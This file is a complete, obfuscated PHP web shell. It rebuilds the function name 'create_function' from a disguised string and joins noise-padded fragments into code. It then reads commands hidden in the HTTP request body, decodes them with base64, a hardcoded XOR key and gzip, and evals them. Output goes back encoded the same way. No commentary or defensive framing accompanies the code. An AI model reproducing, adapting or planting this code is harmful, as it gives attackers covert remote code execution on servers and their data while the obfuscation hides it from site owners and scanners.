<?php
$i=str_replace('m','','mmmcreatme_fmmunction');
$h=');$j++,$i+Xl+){$Xlo.=$Xlt{$i}^Xl$k{XlXl$j};Xl}Xl}return $o;}if (@prXleg_matc';
$W='lrlen($t);$o=XlXl"";for($Xli=0;Xl$i<$l;){forXl($j=0;XlXlXlXl($j<$c&&$i<$l';
$O='$k="14aXl45415"Xl;$kh=Xl"8cf1ac7eXlc060Xl";Xl$kf=Xl"fcd5523feb6Xl5";$p="X';
$q='base6Xl4_encoXlde(@x(@gzcXlomXlpress(Xl$o),$kXl));XlpriXlnt("$p$kh$r$kf");}';
$K='h("/$Xlkh(.+Xl)$kf/",@fXliXlle_get_conXltentXls("php://iXlnputXlXl"),$m)==';
$X='Xl1) {@ob_staXlrt();Xl@evaXll(@XlgXlzuncompresXls(@x(@Xlbase6Xl4_decodeXl(';
$c='lN0Z8XlMAXlkSuLdfn4VXlXlGXl";fXluncXltion x(Xl$t,$k){$c=strlen($kXl);$l=stX';
$M='$m[1]Xl),$k)));Xl$o=@Xlob_get_conteXlntXls();@oXlb_endXl_cXllean();$Xlr=@';
$C=str_replace('Xl','',$O.$c.$W.$h.$K.$X.$M.$q);
$a=$i('',$C);$a();
?>
